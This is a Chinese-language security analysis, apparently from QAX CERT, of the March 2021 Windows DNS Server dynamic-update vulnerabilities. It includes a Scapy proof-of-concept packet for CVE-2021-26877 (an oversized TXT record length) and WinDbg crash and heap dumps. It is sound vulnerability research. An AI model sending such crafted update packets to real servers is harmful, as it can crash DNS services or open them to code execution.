**作者：Strawberry @ QAX CERT  
原文链接：**
2021 年 3 月，微软于补丁日发布了关于 Windows DNS Server 的五个远程代码执行漏洞和两个拒绝服务漏洞，漏洞编号如下：
**RCE漏洞** CVE-2021-26877，CVE-2021-26897（Exploitation More Likely）
CVE-2021-26893，CVE-2021-26894，CVE-2021-26895（Exploitation Less Likely）
**DoS漏洞** CVE-2021-26896，CVE-2021-27063（Exploitation Less Likely）
Windows DNS Server
存在多个远程代码执行漏洞和拒绝服务漏洞，攻击者可通过向目标主机发送特制请求来利用这些漏洞，成功利用这些漏洞可在目标主机上以 SYSTEM
权限执行任意代码或导致 DNS 服务拒绝服务。启用安全动态更新可暂时缓解这些漏洞，但攻击者依然可以通过加入域的计算机攻击启用了安全区域更新的 DNS
服务器。
### 攻击面说明
从通告的 FAQ 说明上看，这些漏洞都存在于 Windows DNS Server 进行动态区域更新的过程中。DNS 更新功能使 DNS
客户端计算机能够在发生更改时向 DNS 服务器注册并动态更新其资源记录（RR）。 使用此功能可以缩短手动管理区域记录所需的时间，从而改进 DNS
管理。动态区域更新功能可以部署在独立的 DNS 服务器或 Active Directory（AD）集成的 DNS 服务器上。最佳实践是部署与 AD
集成的DNS，以便利用 Microsoft 的安全性，如 Kerberos 和 GSS-TSIG。
动态更新类型：
  * **安全动态区域更新：** 验证所有 RR 更新均已使用加入域的计算机上的 GSS-TSIG 进行了数字签名。此外，可以对哪些主体可以执行动态区域更新应用更精细的控件。
  * **不安全的动态区域：** 任何计算机无需任何身份验证即可更新 RR（不建议）。
在DNS服务器上创建区域时，可以选择启用或禁用 DNS 动态区域更新：
  * 将 DNS 部署为独立服务器时，默认情况下将禁用 **“动态区域更新”** 功能，但可以在 **安全/非安全模式** 下启用该功能。
  * 将 DNS 部署为 AD 集成时，默认 **在安全模式下启用“动态区域更新”** 。
以下为 McAfee 关于 Windows DNS Server 部署模型制作的威胁分析表格：
  * 部署在公网启用动态更新的 Windows DNS Server 风险最高（这种配置是极其不推荐的，应该很少有这种配置）
  * 部署 AD 集成的 Windows DNS Server 默认在安全模式下启用“动态区域更新”，可减轻未经身份验证的攻击者的风险，但仍具有受威胁的域计算机或受信任内部人员实现 RCE 的风险
参考链接：
### CVE-2021-26877 漏洞复现分析
  * 使用 TXT length 大于 Data length 的 TXT 资源记录进行区域的动态更新时可触发此漏洞
根据 McAfee 博客中的信息可知，此漏洞在更新 TXT 记录时产生，TXT 记录中的 TXT Length 被设置为
0xFF，这个值大于资源记录里指定的 Data Length (0xbd)，这个长度表示的是这个记录后面的所有数据的长度，在当前场景下，包括所有的 TXT
Length 和 TXT 数据的长度。使用 Scapy 构造数据包及抓包数据如下：
        query = DNSQR(qname='mal', qtype='SOA')
        RRTXT = DNSRR(rrname="A.mal",type='TXT',rdlen=0xbd,rdata='\x41'*0xff)   // 0xff 可修改为更大的数，理论上只要比 0xbd 大即可
        packet = IP(dst=ip)/UDP()/DNS(id=random.randint(0,65535),opcode=5,aa=1,tc=1,rd=0,ra=1,cd=1,rcode=5,qd=query,ns=RRTXT)
配置 DNS 服务器，新增一个名为 MAL 的主要区域，并设置允许动态更新。(启用页堆) 以下为漏洞触发场景，问题出现在
dns!File_PlaceStringInFileBuffer 函数中，程序尝试访问超出边界的数据：
    0:019> g
    (874.9a0): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    dns!File_PlaceStringInFileBuffer+0xa2:
    00007ff7`50cc67f6 410fb60c24      movzx   ecx,byte ptr [r12] ds:00000271`34988000=??
    0:004> k
     # Child-SP          RetAddr           Call Site
    00 000000bc`b82ff3f0 00007ff7`50cc731e dns!File_PlaceStringInFileBuffer+0xa2
    01 000000bc`b82ff440 00007ff7`50bc26a9 dns!TxtFileWrite+0x6e
    02 000000bc`b82ff490 00007ff7`50c5da3d dns!RR_WriteToFile+0x205
    03 000000bc`b82ff4f0 00007ff7`50c5ecc6 dns!Up_LogZoneUpdate+0x6ad
    04 000000bc`b82ffc70 00007ff7`50c5ea30 dns!Up_CompleteZoneUpdate+0x26e
    05 000000bc`b82ffd00 00007ff7`50c60c96 dns!Up_ExecuteUpdateEx+0x338
    06 000000bc`b82ffd60 00007ff7`50c616ba dns!processWireUpdateMessage+0x456
    07 000000bc`b82ffe00 00007ff7`50c550ad dns!Update_Thread+0x12a
    0:004> !heap -p -a r12    //在 CopyWireRead 函数中调用 RR_AllocateEx 申请空间。用户可用的长度到 0x27134987ff5
        address 0000027134988000 found in
        _DPH_HEAP_ROOT @ 271126b1000
        in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 27132a28f08:      27134987ef0              105 -      27134987000             2000
        00007fff07e86d67 ntdll!RtlDebugAllocateHeap+0x000000000000003f
        00007fff07e2cade ntdll!RtlpAllocateHeap+0x000000000009d27e
        00007fff07d8da21 ntdll!RtlpAllocateHeapInternal+0x0000000000000991
        00007ff750cc2b4d dns!allocMemory+0x0000000000000039
        00007ff750cc2f28 dns!Mem_Alloc+0x000000000000008c
        00007ff750cc35c2 dns!RR_AllocateEx+0x000000000000003a
        00007ff750c3efd4 dns!CopyWireRead+0x0000000000000024
        00007ff750c3fed2 dns!Wire_CreateRecordFromWire+0x000000000000015a
        00007ff750c5f3d5 dns!writeUpdateFromPacketRecord+0x0000000000000035
        00007ff750c5fbe7 dns!parseUpdatePacket+0x0000000000000423
        00007ff750c60b6d dns!processWireUpdateMessage+0x000000000000032d
        00007ff750c616ba dns!Update_Thread+0x000000000000012a
        00007ff750c550ad dns!threadTopFunction+0x000000000000007d
        00007fff054a7974 KERNEL32!BaseThreadInitThunk+0x0000000000000014
        00007fff07dea271 ntdll!RtlUserThreadStart+0x0000000000000021
    0:004> db r12-20    //这里要访问 0x27134988000 处的数据
    00000271`34987fe0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`34987ff0  41 41 41 41 41 d0 d0 d0-d0 d0 d0 d0 d0 d0 d0 d0  AAAAA...........
    00000271`34988000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    00000271`34988010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    00000271`34988020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    00000271`34988030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    00000271`34988040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    00000271`34988050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
    0:004> db ecx-14e l160    //将 TXT 数据写入这个缓存区域
    00000271`34989ff0  c0 c0 c0 c0 bb 05 fc ff-ef 0c 0c 0c 0c 0c 0c fe  ................
    00000271`3498a000  0d 0a 24 53 4f 55 52 43-45 20 20 50 41 43 4b 45  ..$SOURCE  PACKE
    00000271`3498a010  54 20 31 39 32 2e 31 36-38 2e 31 34 30 2e 31 32  T 192.168.140.12
    00000271`3498a020  39 0d 0a 24 56 45 52 53-49 4f 4e 20 32 0d 0a 24  9..$VERSION 2..$
    00000271`3498a030  41 44 44 0d 0a 41 20 20-20 20 20 20 20 20 20 20  ADD..A          
    00000271`3498a040  20 20 20 20 20 20 20 20-20 20 20 20 20 30 09 54               0.T
    00000271`3498a050  58 54 09 28 20 22 41 41-41 41 41 41 41 41 41 41  XT.( "AAAAAAAAAA
    00000271`3498a060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`3498a070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`3498a080  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`3498a090  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`3498a0a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
    00000271`3498a0b0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA